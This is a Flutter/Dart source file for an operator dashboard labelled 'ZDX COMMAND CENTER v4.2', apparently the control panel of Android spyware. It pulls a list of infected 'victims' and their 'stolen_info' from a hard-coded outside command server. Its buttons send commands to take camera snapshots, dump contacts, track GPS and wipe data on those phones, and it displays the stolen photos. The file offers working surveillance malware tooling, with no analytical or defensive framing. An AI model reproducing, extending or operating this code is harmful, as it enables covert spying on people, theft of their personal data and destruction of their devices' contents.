import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

class ZDXDashboard extends StatefulWidget {
  const ZDXDashboard({super.key});

  @override
  _ZDXDashboardState createState() => _ZDXDashboardState();
}

class _ZDXDashboardState extends State<ZDXDashboard> {
  List victims = [];
  bool isLoading = false;
  final String serverUrl = "http://papi.queen-priv.my.id:2417";

  Future<void> fetchVictims() async {
    if (!mounted) return;
    setState(() => isLoading = true);
    try {
      final res = await http.get(Uri.parse("$serverUrl/list")).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        setState(() => victims = json.decode(res.body));
      }
    } catch (e) {
      debugPrint("Fetch Error: $e");
    } finally {
      if (mounted) setState(() => isLoading = false);
    }
  }

  Future<void> sendCommand(String victimId, String command) async {
    try {
      final res = await http.post(
        Uri.parse("$serverUrl/send_command"),
        body: jsonEncode({"id": victimId, "cmd": command}),
        headers: {"Content-Type": "application/json"},
      );
      
      if (res.statusCode == 200) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            backgroundColor: Colors.green[900],
            behavior: SnackBarBehavior.floating,
            content: Text("SENT: [$command] TO $victimId", 
              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.greenAccent)),
          ),
        );
      }
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Failed to connect to Command Server")),
      );
    }
  }

  @override
  void initState() {
    super.initState();
    fetchVictims();
    Timer.periodic(const Duration(seconds: 15), (t) => fetchVictims());
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("ZDX COMMAND CENTER v4.2", 
          style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold, letterSpacing: 2, fontSize: 14)),
        backgroundColor: Colors.black,
        centerTitle: true,
        elevation: 0,
        actions: [
          IconButton(icon: const Icon(Icons.sync, color: Colors.red), onPressed: fetchVictims)
        ],
      ),
      body: isLoading && victims.isEmpty
        ? const Center(child: CircularProgressIndicator(color: Colors.red))
        : victims.isEmpty 
          ? _buildEmptyState()
          : ListView.builder(
              itemCount: victims.length,
              itemBuilder: (context, i) => _buildVictimCard(i),
            ),
    );
  }

  Widget _buildEmptyState() {
    return const Center(child: Text("NO ACTIVE TARGETS", style: TextStyle(color: Colors.grey)));
  }

  Widget _buildVictimCard(int i) {
    String logData = victims[i]['stolen_info'] ?? '';

    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: Colors.grey[900]?.withOpacity(0.3),
        border: Border.all(color: Colors.red.withOpacity(0.2)),
        borderRadius: BorderRadius.circular(4)
      ),
      child: ExpansionTile(
        iconColor: Colors.red,
        collapsedIconColor: Colors.grey,
        leading: const Icon(Icons.android, color: Colors.greenAccent, size: 20),
        title: Text(victims[i]['model'] ?? 'Unknown Device', 
          style: const TextStyle(color: Colors.white, fontSize: 13)),
        children: [
          Padding(
            padding: const EdgeInsets.all(12),
            child: Column(
              children: [
                Wrap(
                  spacing: 6,
                  runSpacing: 6,
                  children: [
                    _actionButton("PHOTO", Colors.purple, () => sendCommand(victims[i]['id'], "take_snapshot")),
                    _actionButton("CONTACTS", Colors.blue, () => sendCommand(victims[i]['id'], "dump_contacts")),
                    _actionButton("GPS", Colors.green, () => sendCommand(victims[i]['id'], "track_gps")),
                    _actionButton("WIPE", Colors.red, () => sendCommand(victims[i]['id'], "wipe_data")),
                  ],
                ),
                const SizedBox(height: 15),
                _buildDynamicLog(logData),
              ],
            ),
          )
        ],
      ),
    );
  }

  Widget _buildDynamicLog(String log) {
    bool isImage = log.startsWith("IMG_DATA:");
    
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text("DATA LOG OUTPUT:", style: TextStyle(color: Colors.grey, fontSize: 9)),
        const SizedBox(height: 6),
        Container(
          width: double.infinity,
          constraints: const BoxConstraints(maxHeight: 250),
          padding: const EdgeInsets.all(8),
          decoration: BoxDecoration(
            color: Colors.black,
            border: Border.all(color: Colors.white12),
          ),
          child: isImage 
            ? _buildImagePreview(log.replaceFirst("IMG_DATA:", ""))
            : SingleChildScrollView(
                child: Text(log.isEmpty ? "Waiting for response..." : log, 
                  style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontFamily: 'ShareTechMono')),
              ),
        )
      ],
    );
  }

  Widget _buildImagePreview(String base64Str) {
    try {
      return Column(
        children: [
          const Text("[ SNAPSHOT DETECTED ]", style: TextStyle(color: Colors.purpleAccent, fontSize: 10)),
          const SizedBox(height: 8),
          Expanded(
            child: Image.memory(
              base64Decode(base64Str),
              fit: BoxFit.contain,
              errorBuilder: (context, error, stackTrace) => const Text("Invalid Image Data", style: TextStyle(color: Colors.red)),
            ),
          ),
          TextButton(
            onPressed: () => _showLargeImage(base64Str),
            child: const Text("VIEW FULLSCREEN", style: TextStyle(color: Colors.blue, fontSize: 10)),
          )
        ],
      );
    } catch (e) {
      return const Text("Error Decoding Image", style: TextStyle(color: Colors.red));
    }
  }

  void _showLargeImage(String base64Str) {
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.black,
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Image.memory(base64Decode(base64Str)),
            TextButton(onPressed: () => Navigator.pop(context), child: const Text("CLOSE"))
          ],
        ),
      ),
    );
  }

  Widget _actionButton(String title, Color color, VoidCallback onPress) {
    return SizedBox(
      height: 30,
      child: OutlinedButton(
        style: OutlinedButton.styleFrom(
          side: BorderSide(color: color.withOpacity(0.5)),
          backgroundColor: color.withOpacity(0.1),
        ),
        onPressed: onPress,
        child: Text(title, style: TextStyle(fontSize: 9, color: color, fontWeight: FontWeight.bold)),
      ),
    );
  }
}